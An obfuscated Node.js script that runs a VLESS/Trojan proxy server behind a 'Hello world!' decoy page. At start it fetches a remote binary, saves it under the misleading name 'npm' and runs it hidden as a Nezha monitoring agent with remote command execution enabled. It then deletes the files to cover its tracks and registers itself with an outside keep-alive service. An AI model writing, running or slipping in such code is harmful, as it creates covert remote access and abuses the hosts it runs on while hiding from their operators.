const _0x456b80=_0x306b;function _0x1b39(){const _0x4dfa7b=['map','Answer','1.1.1.1','sha224','https://speed.cloudflare.com/meta','NEZHA_SERVER','1110976CFRsMz','join','writeHead','Failed\x20to\x20resolve\x20','/bin/bash','test','6214278mjxJbH','SUB_PATH','utf8','send','end','update','slice','&type=A','asOrganization','log','setsid\x20nohup\x20./npm\x20-s\x20','length','1234.abc.com','15coJMCM','createServer','Server','https://','91048AKDxGD','47691OKNhva','application/json','https://arm64.ssss.nyc.mn/v1','f3d9d471-709b-4b76-8ea6-b98e00b85015',':443?security=tls&sni=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','sub','close','path','8443','error','chmod\x20+x\x20npm','2083',':443?encryption=none&security=tls&sni=','Hello\x20world!','createHash','trim','2053','finish','533582HOZqUi','https://amd64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','443','connection','message','readUInt16BE','env','Status','2087','child_process','includes','write','https://dns.google/resolve?name=','toString','connect','vless://','aarch64','pop','application/dns-json','NAME','digest','reduce','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','8.8.4.4','utf-8','https://arm64.ssss.nyc.mn/agent','get','NEZHA_PORT','from','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2194160tEIdAQ','Hug','888EiDLik','arch','createWriteStream','once','pipe','then','every','config.yaml','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','6PoovKE','780024zZQaVb','false','error:\x20','buffer','listen','url','decode','net','text/html','hex','npm','npm\x20is\x20already\x20running,\x20skip\x20running...','DOMAIN','trojan://','post','&fp=chrome&type=ws&host=','replace','concat','find','catch','split','readUInt8','stream','arm','NEZHA_KEY','data','--tls','index.html','AUTO_ACCESS','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','readFile','axios','arm64','&path=%2F','https://amd64.ssss.nyc.mn/agent','npm\x20is\x20running','true','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm\x20running\x20error:'];_0x1b39=function(){return _0x4dfa7b;};return _0x1b39();}(function(_0x4c5cd7,_0x2edf21){const _0x42aca7=_0x306b,_0x3158eb=_0x4c5cd7();while(!![]){try{const _0x4ddec2=-parseInt(_0x42aca7(0x186))/0x1+-parseInt(_0x42aca7(0x172))/0x2+-parseInt(_0x42aca7(0x1b0))/0x3*(parseInt(_0x42aca7(0x15b))/0x4)+parseInt(_0x42aca7(0x16e))/0x5*(parseInt(_0x42aca7(0x1b1))/0x6)+parseInt(_0x42aca7(0x161))/0x7+-parseInt(_0x42aca7(0x1a7))/0x8*(-parseInt(_0x42aca7(0x173))/0x9)+-parseInt(_0x42aca7(0x1a5))/0xa;if(_0x4ddec2===_0x2edf21)break;else _0x3158eb['push'](_0x3158eb['shift']());}catch(_0x5bf513){_0x3158eb['push'](_0x3158eb['shift']());}}}(_0x1b39,0x7cfc9));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x456b80(0x1d1)),net=require(_0x456b80(0x1b8)),path=require(_0x456b80(0x17b)),crypto=require('crypto'),{Buffer}=require(_0x456b80(0x1b4)),{exec,execSync}=require(_0x456b80(0x190)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x456b80(0x18d)][_0x456b80(0x1cf)]||_0x456b80(0x176),NEZHA_SERVER=process[_0x456b80(0x18d)][_0x456b80(0x15a)]||'',NEZHA_PORT=process[_0x456b80(0x18d)][_0x456b80(0x1a2)]||'',NEZHA_KEY=process[_0x456b80(0x18d)][_0x456b80(0x1c9)]||'',DOMAIN=process['env'][_0x456b80(0x1bd)]||_0x456b80(0x16d),AUTO_ACCESS=process[_0x456b80(0x18d)][_0x456b80(0x1cd)]||!![],WSPATH=process[_0x456b80(0x18d)]['WSPATH']||UUID[_0x456b80(0x167)](0x0,0x8),SUB_PATH=process['env'][_0x456b80(0x162)]||_0x456b80(0x179),NAME=process[_0x456b80(0x18d)][_0x456b80(0x19a)]||_0x456b80(0x1a6),PORT=process[_0x456b80(0x18d)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0xf7a604=_0x456b80;try{const _0x134f6a=await axios[_0xf7a604(0x1a1)](_0xf7a604(0x159)),_0x5db380=_0x134f6a[_0xf7a604(0x1ca)];ISP=(_0x5db380['country']+'-'+_0x5db380[_0xf7a604(0x169)])[_0xf7a604(0x1c1)](/ /g,'_');}catch(_0x48a075){ISP='Unknown';}};GetISP();const httpServer=http[_0x456b80(0x16f)]((_0x31a45c,_0x5e77c7)=>{const _0x1b1f59=_0x456b80;if(_0x31a45c[_0x1b1f59(0x1b6)]==='/'){const _0x5bd45a=path[_0x1b1f59(0x15c)](__dirname,_0x1b1f59(0x1cc));fs[_0x1b1f59(0x1d0)](_0x5bd45a,_0x1b1f59(0x163),(_0x36abe1,_0x5e28b1)=>{const _0x338a1b=_0x1b1f59;if(_0x36abe1){_0x5e77c7[_0x338a1b(0x15d)](0xc8,{'Content-Type':_0x338a1b(0x1b9)}),_0x5e77c7['end'](_0x338a1b(0x181));return;}_0x5e77c7['writeHead'](0xc8,{'Content-Type':_0x338a1b(0x1b9)}),_0x5e77c7['end'](_0x5e28b1);});return;}else{if(_0x31a45c[_0x1b1f59(0x1b6)]==='/'+SUB_PATH){const _0x510ae9=_0x1b1f59(0x196)+UUID+'@'+DOMAIN+_0x1b1f59(0x180)+DOMAIN+_0x1b1f59(0x1c0)+DOMAIN+_0x1b1f59(0x1d3)+WSPATH+'#'+NAME+'-'+ISP,_0x495199=_0x1b1f59(0x1be)+UUID+'@'+DOMAIN+_0x1b1f59(0x177)+DOMAIN+_0x1b1f59(0x1c0)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x585049=_0x510ae9+'\x0a'+_0x495199,_0x1d3fc5=Buffer[_0x1b1f59(0x1a3)](_0x585049)['toString']('base64');_0x5e77c7['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x5e77c7[_0x1b1f59(0x165)](_0x1d3fc5+'\x0a');}else _0x5e77c7['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x5e77c7[_0x1b1f59(0x165)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x456b80(0x170))]({'server':httpServer}),uuid=UUID[_0x456b80(0x1c1)](/-/g,''),DNS_SERVERS=[_0x456b80(0x19e),_0x456b80(0x157)];function resolveHost(_0x3344cc){return new Promise((_0x517cec,_0x5693de)=>{const _0x4b5b6e=_0x306b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4b5b6e(0x160)](_0x3344cc)){_0x517cec(_0x3344cc);return;}let _0x2dec22=0x0;function _0x571416(){const _0x12f32c=_0x4b5b6e;if(_0x2dec22>=DNS_SERVERS[_0x12f32c(0x16c)]){_0x5693de(new Error(_0x12f32c(0x15e)+_0x3344cc+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x37e7bc=DNS_SERVERS[_0x2dec22];_0x2dec22++;const _0x2e7cfc=_0x12f32c(0x193)+encodeURIComponent(_0x3344cc)+_0x12f32c(0x168);axios['get'](_0x2e7cfc,{'timeout':0x1388,'headers':{'Accept':_0x12f32c(0x199)}})['then'](_0x1adedc=>{const _0x3d0248=_0x12f32c,_0x254d9f=_0x1adedc[_0x3d0248(0x1ca)];if(_0x254d9f[_0x3d0248(0x18e)]===0x0&&_0x254d9f[_0x3d0248(0x1da)]&&_0x254d9f[_0x3d0248(0x1da)]['length']>0x0){const _0x2e2850=_0x254d9f[_0x3d0248(0x1da)][_0x3d0248(0x1c3)](_0x2b43ed=>_0x2b43ed['type']===0x1);if(_0x2e2850){_0x517cec(_0x2e2850['data']);return;}}_0x571416();})['catch'](_0x279a9e=>{_0x571416();});}_0x571416();});}function handleVlessConnection(_0x2f14fb,_0x569097){const _0x4c4abb=_0x456b80,[_0xc7359c]=_0x569097,_0x1b2dc4=_0x569097[_0x4c4abb(0x167)](0x1,0x11);if(!_0x1b2dc4[_0x4c4abb(0x1ad)]((_0x56e49b,_0x57bc09)=>_0x56e49b==parseInt(uuid['substr'](_0x57bc09*0x2,0x2),0x10)))return![];let _0xf57ef4=_0x569097[_0x4c4abb(0x167)](0x11,0x12)[_0x4c4abb(0x1c6)]()+0x13;const _0x1411e8=_0x569097[_0x4c4abb(0x167)](_0xf57ef4,_0xf57ef4+=0x2)[_0x4c4abb(0x18c)](0x0),_0x52e349=_0x569097[_0x4c4abb(0x167)](_0xf57ef4,_0xf57ef4+=0x1)[_0x4c4abb(0x1c6)](),_0x4e3e01=_0x52e349==0x1?_0x569097[_0x4c4abb(0x167)](_0xf57ef4,_0xf57ef4+=0x4)[_0x4c4abb(0x15c)]('.'):_0x52e349==0x2?new TextDecoder()[_0x4c4abb(0x1b7)](_0x569097[_0x4c4abb(0x167)](_0xf57ef4+0x1,_0xf57ef4+=0x1+_0x569097[_0x4c4abb(0x167)](_0xf57ef4,_0xf57ef4+0x1)[_0x4c4abb(0x1c6)]())):_0x52e349==0x3?_0x569097[_0x4c4abb(0x167)](_0xf57ef4,_0xf57ef4+=0x10)[_0x4c4abb(0x19c)]((_0xe2835e,_0x120cb8,_0x4b0a2f,_0x1ba24c)=>_0x4b0a2f%0x2?_0xe2835e['concat'](_0x1ba24c[_0x4c4abb(0x167)](_0x4b0a2f-0x1,_0x4b0a2f+0x1)):_0xe2835e,[])[_0x4c4abb(0x1d9)](_0x55cd57=>_0x55cd57['readUInt16BE'](0x0)[_0x4c4abb(0x194)](0x10))[_0x4c4abb(0x15c)](':'):'';_0x2f14fb[_0x4c4abb(0x164)](new Uint8Array([_0xc7359c,0x0]));const _0xeb55e7=createWebSocketStream(_0x2f14fb);return resolveHost(_0x4e3e01)[_0x4c4abb(0x1ac)](_0x4b3f43=>{const _0x41bc2b=_0x4c4abb;net[_0x41bc2b(0x195)]({'host':_0x4b3f43,'port':_0x1411e8},function(){const _0xb65fdf=_0x41bc2b;this[_0xb65fdf(0x192)](_0x569097[_0xb65fdf(0x167)](_0xf57ef4)),_0xeb55e7['on'](_0xb65fdf(0x17d),()=>{})[_0xb65fdf(0x1ab)](this)['on'](_0xb65fdf(0x17d),()=>{})[_0xb65fdf(0x1ab)](_0xeb55e7);})['on']('error',()=>{});})[_0x4c4abb(0x1c4)](_0xa73264=>{const _0x486ee0=_0x4c4abb;net[_0x486ee0(0x195)]({'host':_0x4e3e01,'port':_0x1411e8},function(){const _0x1d2403=_0x486ee0;this[_0x1d2403(0x192)](_0x569097[_0x1d2403(0x167)](_0xf57ef4)),_0xeb55e7['on']('error',()=>{})[_0x1d2403(0x1ab)](this)['on'](_0x1d2403(0x17d),()=>{})[_0x1d2403(0x1ab)](_0xeb55e7);})['on'](_0x486ee0(0x17d),()=>{});}),!![];}function handleTrojanConnection(_0x3cc2be,_0x5b7684){const _0x344815=_0x456b80;try{if(_0x5b7684[_0x344815(0x16c)]<0x3a)return![];const _0x550b71=_0x5b7684[_0x344815(0x167)](0x0,0x38)[_0x344815(0x194)](),_0x181f3e=[UUID];let _0x1d6e6d=null;for(const _0x973b of _0x181f3e){const _0x5d9925=crypto[_0x344815(0x182)](_0x344815(0x158))[_0x344815(0x166)](_0x973b)[_0x344815(0x19b)](_0x344815(0x1ba));if(_0x5d9925===_0x550b71){_0x1d6e6d=_0x973b;break;}}if(!_0x1d6e6d)return![];let _0xcb5cf0=0x38;_0x5b7684[_0xcb5cf0]===0xd&&_0x5b7684[_0xcb5cf0+0x1]===0xa&&(_0xcb5cf0+=0x2);const _0x106926=_0x5b7684[_0xcb5cf0];if(_0x106926!==0x1)return![];_0xcb5cf0+=0x1;const _0x318e75=_0x5b7684[_0xcb5cf0];_0xcb5cf0+=0x1;let _0x3cc264,_0x30e7d7;if(_0x318e75===0x1)_0x3cc264=_0x5b7684[_0x344815(0x167)](_0xcb5cf0,_0xcb5cf0+0x4)[_0x344815(0x15c)]('.'),_0xcb5cf0+=0x4;else{if(_0x318e75===0x3){const _0x4abe25=_0x5b7684[_0xcb5cf0];_0xcb5cf0+=0x1,_0x3cc264=_0x5b7684[_0x344815(0x167)](_0xcb5cf0,_0xcb5cf0+_0x4abe25)[_0x344815(0x194)](),_0xcb5cf0+=_0x4abe25;}else{if(_0x318e75===0x4)_0x3cc264=_0x5b7684[_0x344815(0x167)](_0xcb5cf0,_0xcb5cf0+0x10)['reduce']((_0x3fac3a,_0x23a3ca,_0x575691,_0x551927)=>_0x575691%0x2?_0x3fac3a[_0x344815(0x1c2)](_0x551927['slice'](_0x575691-0x1,_0x575691+0x1)):_0x3fac3a,[])['map'](_0xa63a0d=>_0xa63a0d[_0x344815(0x18c)](0x0)['toString'](0x10))[_0x344815(0x15c)](':'),_0xcb5cf0+=0x10;else return![];}}_0x30e7d7=_0x5b7684['readUInt16BE'](_0xcb5cf0),_0xcb5cf0+=0x2;_0xcb5cf0<_0x5b7684[_0x344815(0x16c)]&&_0x5b7684[_0xcb5cf0]===0xd&&_0x5b7684[_0xcb5cf0+0x1]===0xa&&(_0xcb5cf0+=0x2);const _0x426bfa=createWebSocketStream(_0x3cc2be);return resolveHost(_0x3cc264)['then'](_0x219c47=>{const _0x3f0afa=_0x344815;net[_0x3f0afa(0x195)]({'host':_0x219c47,'port':_0x30e7d7},function(){const _0x281e75=_0x3f0afa;_0xcb5cf0<_0x5b7684[_0x281e75(0x16c)]&&this['write'](_0x5b7684['slice'](_0xcb5cf0)),_0x426bfa['on'](_0x281e75(0x17d),()=>{})[_0x281e75(0x1ab)](this)['on'](_0x281e75(0x17d),()=>{})[_0x281e75(0x1ab)](_0x426bfa);})['on'](_0x3f0afa(0x17d),()=>{});})['catch'](_0x1253f9=>{const _0x47ae1a=_0x344815;net[_0x47ae1a(0x195)]({'host':_0x3cc264,'port':_0x30e7d7},function(){const _0x241ea5=_0x47ae1a;_0xcb5cf0<_0x5b7684[_0x241ea5(0x16c)]&&this[_0x241ea5(0x192)](_0x5b7684[_0x241ea5(0x167)](_0xcb5cf0)),_0x426bfa['on'](_0x241ea5(0x17d),()=>{})['pipe'](this)['on'](_0x241ea5(0x17d),()=>{})[_0x241ea5(0x1ab)](_0x426bfa);})['on'](_0x47ae1a(0x17d),()=>{});}),!![];}catch(_0x5d9b96){return![];}}wss['on'](_0x456b80(0x18a),(_0x16ae0e,_0x4f137d)=>{const _0x44e6ad=_0x456b80,_0x44a9d6=_0x4f137d[_0x44e6ad(0x1b6)]||'';_0x16ae0e[_0x44e6ad(0x1aa)](_0x44e6ad(0x18b),_0x51f2a0=>{const _0x59cbaf=_0x44e6ad;if(_0x51f2a0['length']>0x11&&_0x51f2a0[0x0]===0x0){const _0x507434=_0x51f2a0['slice'](0x1,0x11),_0x34cb94=_0x507434[_0x59cbaf(0x1ad)]((_0x48f971,_0x1886d6)=>_0x48f971==parseInt(uuid['substr'](_0x1886d6*0x2,0x2),0x10));if(_0x34cb94){!handleVlessConnection(_0x16ae0e,_0x51f2a0)&&_0x16ae0e[_0x59cbaf(0x17a)]();return;}}!handleTrojanConnection(_0x16ae0e,_0x51f2a0)&&_0x16ae0e['close']();})['on'](_0x44e6ad(0x17d),()=>{});});const getDownloadUrl=()=>{const _0xcf2d04=_0x456b80,_0xea5692=os[_0xcf2d04(0x1a8)]();return _0xea5692===_0xcf2d04(0x1c8)||_0xea5692===_0xcf2d04(0x1d2)||_0xea5692===_0xcf2d04(0x197)?!NEZHA_PORT?_0xcf2d04(0x175):_0xcf2d04(0x1a0):!NEZHA_PORT?_0xcf2d04(0x187):_0xcf2d04(0x1d4);},downloadFile=async()=>{const _0x2fbb09=_0x456b80;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x437f1a=getDownloadUrl(),_0x23a895=await axios({'method':_0x2fbb09(0x1a1),'url':_0x437f1a,'responseType':_0x2fbb09(0x1c7)}),_0x581962=fs[_0x2fbb09(0x1a9)](_0x2fbb09(0x1bb));return _0x23a895['data']['pipe'](_0x581962),new Promise((_0x3b3840,_0x4097f5)=>{const _0x3f1531=_0x2fbb09;_0x581962['on'](_0x3f1531(0x185),()=>{const _0x452c06=_0x3f1531;console[_0x452c06(0x16a)]('npm\x20download\x20successfully'),exec(_0x452c06(0x17e),_0x58bd58=>{if(_0x58bd58)_0x4097f5(_0x58bd58);_0x3b3840();});}),_0x581962['on'](_0x3f1531(0x17d),_0x4097f5);});}catch(_0x465069){throw _0x465069;}},runnz=async()=>{const _0x13b71a=_0x456b80;try{const _0x380ac5=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x13b71a(0x19f)});if(_0x380ac5[_0x13b71a(0x183)]()!==''){console[_0x13b71a(0x16a)](_0x13b71a(0x1bc));return;}}catch(_0xd963a0){}await downloadFile();let _0x3de2ac='',_0x497b6c=[_0x13b71a(0x189),_0x13b71a(0x17c),'2096',_0x13b71a(0x18f),_0x13b71a(0x17f),_0x13b71a(0x184)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x512d9a=_0x497b6c[_0x13b71a(0x191)](NEZHA_PORT)?_0x13b71a(0x1cb):'';_0x3de2ac=_0x13b71a(0x16b)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x512d9a+_0x13b71a(0x1a4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2a4d86=NEZHA_SERVER[_0x13b71a(0x191)](':')?NEZHA_SERVER[_0x13b71a(0x1c5)](':')[_0x13b71a(0x198)]():'',_0x4cb832=_0x497b6c[_0x13b71a(0x191)](_0x2a4d86)?_0x13b71a(0x1d6):_0x13b71a(0x1b2),_0x676c93='client_secret:\x20'+NEZHA_KEY+_0x13b71a(0x1d7)+NEZHA_SERVER+_0x13b71a(0x19d)+_0x4cb832+_0x13b71a(0x1ce)+UUID;fs['writeFileSync'](_0x13b71a(0x1ae),_0x676c93);}_0x3de2ac=_0x13b71a(0x1af);}else{console[_0x13b71a(0x16a)](_0x13b71a(0x178));return;}}try{exec(_0x3de2ac,{'shell':_0x13b71a(0x15f)},_0x2479bf=>{const _0x343f39=_0x13b71a;if(_0x2479bf)console[_0x343f39(0x17d)](_0x343f39(0x1d8),_0x2479bf);else console[_0x343f39(0x16a)](_0x343f39(0x1d5));});}catch(_0x4885f1){console[_0x13b71a(0x17d)](_0x13b71a(0x1b3)+_0x4885f1);}};async function addAccessTask(){const _0x3e209b=_0x456b80;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x850ec4=_0x3e209b(0x171)+DOMAIN;try{const _0x94bae0=await axios[_0x3e209b(0x1bf)]('https://oooo.serv00.net/add-url',{'url':_0x850ec4},{'headers':{'Content-Type':_0x3e209b(0x174)}});console[_0x3e209b(0x16a)](_0x3e209b(0x188));}catch(_0x1fa001){}}function _0x306b(_0x5e0e9b,_0x432881){const _0x1b3968=_0x1b39();return _0x306b=function(_0x306b3a,_0x528afd){_0x306b3a=_0x306b3a-0x157;let _0x5842ef=_0x1b3968[_0x306b3a];return _0x5842ef;},_0x306b(_0x5e0e9b,_0x432881);}const delFiles=()=>{const _0xd12357=_0x456b80;fs['unlink'](_0xd12357(0x1bb),()=>{}),fs['unlink'](_0xd12357(0x1ae),()=>{});};httpServer[_0x456b80(0x1b5)](PORT,()=>{const _0x4b8262=_0x456b80;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4b8262(0x16a)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
